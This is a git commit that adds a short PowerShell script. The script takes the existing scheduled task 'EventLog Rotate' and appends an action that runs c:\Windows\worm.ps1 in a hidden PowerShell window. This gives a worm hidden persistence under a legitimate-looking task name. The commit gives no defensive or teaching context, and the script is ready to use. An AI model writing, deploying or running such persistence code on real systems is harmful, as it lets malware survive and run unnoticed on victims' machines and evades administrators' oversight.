38f9f8b0b458d457dbe2496233473b3a173cd9f1
Anthony Magrene <ekfhalomaster@gmail.com>
2021-02-04 00:38:19 -0500

    Create AddAction.ps1

---
+++ AddAction.ps1
@@ -0,0 +1,6 @@
+﻿Get-ScheduledTask -TaskName 'EventLog Rotate' | ForEach-Object{ $actions = $_.Actions 
+
+
+$actions += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "c:\Windows\worm.ps1"'
+Set-ScheduledTask -TaskName "EventLog Rotate" -Action $actions
+}
